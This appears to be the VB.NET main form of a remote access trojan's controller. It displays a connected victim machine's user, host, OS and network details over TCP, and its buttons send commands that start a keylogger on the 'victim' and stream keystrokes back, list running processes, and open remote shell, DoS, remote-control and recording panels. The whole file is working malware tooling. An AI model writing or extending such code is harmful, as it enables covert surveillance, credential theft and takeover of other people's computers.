Imports System.IO
Imports System.Text
Imports System.Net.Sockets
Imports System.Threading

Public Class Main
    Public TCPClient As New TcpClient
    Dim NetStream As NetworkStream
    Dim information() As String
    Dim data As String
    Dim get_another As Integer = 3
    Dim check As String
    Public Sub New(ByVal info() As String, ByVal connection As TcpClient)
        ' This call is required by the designer.
        InitializeComponent()
        Timer1.Enabled = False
        Desktop2.BringToFront()
        ' Add any initialization after the InitializeComponent() call.
        information = info
        TCPClient = connection
        NetStream = TCPClient.GetStream()
        Task2.TCPClient = TCPClient
        Task2.NetStream = NetStream
        Record1.TCPClient = TCPClient
        Record1.NetStream = NetStream
        Remote1.TCPClient = TCPClient
        Remote1.NetStream = NetStream
        Desktop2.TCPClient = TCPClient
        Desktop2.NetStream = NetStream
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button8.Click
        sidepanel2.Location = New Point(0, 0)
        Desktop2.BringToFront()
        Timer2.Enabled = False
        If NetStream.CanWrite Then
            Dim sendBytes As Byte() = Encoding.ASCII.GetBytes("1")
            NetStream.Write(sendBytes, 0, sendBytes.Length)
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button9.Click
        disable_allbutton()
        If get_another = 3 Then
            sidepanel2.Location = New Point(0, 325)
            Task2.BringToFront()
            Task2.ListBox1.Items.Clear()
            Task2.ListBox2.Items.Clear()
            get_another = 0
            Task2.memory.Visible = False
            Task2.FlatLabel1.Visible = False
            If NetStream.CanWrite Then
                Dim sendBytes As Byte() = Encoding.ASCII.GetBytes("Task0")
                NetStream.Write(sendBytes, 0, sendBytes.Length)
            End If
            Timer2.Enabled = False
            Timer1.Enabled = True
            check = "Task"
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button10.Click
        sidepanel2.Location = New Point(0, 50)
        Cmd1.BringToFront()
        Timer1.Enabled = False
        Timer2.Enabled = False
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button11.Click
        sidepanel2.Location = New Point(0, 105)
        Dos1.BringToFront()
        Timer1.Enabled = False
        Timer2.Enabled = False

    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button13.Click
        sidepanel2.Location = New Point(0, 160)
        Key1.FlatTextBox1.Text = ""
        Key1.BringToFront()
        'send the specific key to the victim to run the keylogger
        If NetStream.CanWrite Then
            Dim sendBytes As Byte() = Encoding.ASCII.GetBytes("Key")
            NetStream.Write(sendBytes, 0, sendBytes.Length)
            'start a timer to read the key from the user
            Timer2.Enabled = True
        End If
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button12.Click
        sidepanel2.Location = New Point(0, 215)
        Remote1.BringToFront()
        Timer1.Enabled = False
        Timer2.Enabled = False
    End Sub



    Private Sub Main_Load(sender As Object, e As EventArgs) Handles Me.Load
        Desktop2.username.Text = information(0)
        Desktop2.os.Text = information(1)
        Desktop2.hostname.Text = information(2)
        Cmd1.hostname = information(2)
        Cmd1.username = information(0)
        Dos1.ip = information(4)
        Desktop2.macaddress.Text = information(3)
        Desktop2.ipaddress.Text = information(4)
        Desktop2.osplatform.Text = information(5)
        Desktop2.osversion.Text = information(6)
        Desktop2.pysicalmemory.Text = information(7)
        Desktop2.virtualmemory.Text = information(8)
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Me.Close()
    End Sub


    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ct As Integer = 0
        If NetStream.CanRead Then
            'read the data stream
            If NetStream.DataAvailable Then
                'receive the buffer size
                Dim bytes(TCPClient.ReceiveBufferSize) As Byte
                NetStream.Read(bytes, 0, TCPClient.ReceiveBufferSize)
                data = Encoding.ASCII.GetString(bytes)
                information = data.Split(";")
                Select Case check
                    Case "Task"
                        If get_another = 0 Then
                            Dim check_memory_process((information.Length) / 2) As String
                            For number As Integer = 0 To information.Length - 2
                                Task2.ListBox1.Items.Add(information(number))
                                If ct < information.Length - 3 Then
                                    check_memory_process(ct) = information(number + 1)
                                    ct += 1
                                End If
                                number += 1
                            Next
                            'get the currenet running process
                            Task2.check_memory_process = check_memory_process
                            If NetStream.CanWrite Then
                                'request for background running process
                                Dim sendBytes As Byte() = Encoding.ASCII.GetBytes("Task1")
                                NetStream.Write(sendBytes, 0, sendBytes.Length)
                            End If
                            get_another = 1
                        Else
                            'get the  background running process
                            For number As Integer = 0 To information.Length - 2
                                Task2.ListBox2.Items.Add(information(number))
                                get_another = 3
                            Next
                            Task2.Button1.Visible = True
                            Timer1.Enabled = False
                            enable_allbutton()
                        End If
                End Select
            End If
        End If
    End Sub

    Private Sub disable_allbutton()
        Button8.Enabled = False
        Button9.Enabled = False
        Button10.Enabled = False
        Button11.Enabled = False
        Button13.Enabled = False
        Button12.Enabled = False
        Button14.Enabled = False
    End Sub

    Private Sub enable_allbutton()
        Button8.Enabled = True
        Button9.Enabled = True
        Button10.Enabled = True
        Button11.Enabled = True
        Button13.Enabled = True
        Button12.Enabled = True
        Button14.Enabled = True
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If NetStream.CanRead Then
            'read the data stream
            If NetStream.DataAvailable Then
                data = ""
                'receive the buffer size
                Dim bytes(TCPClient.ReceiveBufferSize) As Byte
                NetStream.Read(bytes, 0, TCPClient.ReceiveBufferSize)
                data = Encoding.ASCII.GetString(bytes)
                Key1.FlatTextBox1.Text = Key1.FlatTextBox1.Text + data

            End If
        End If
    End Sub

    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click
        sidepanel2.Location = New Point(0, 270)
        Record1.BringToFront()
        Timer2.Enabled = False
        Timer1.Enabled = False
    End Sub

    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click

    End Sub
End Class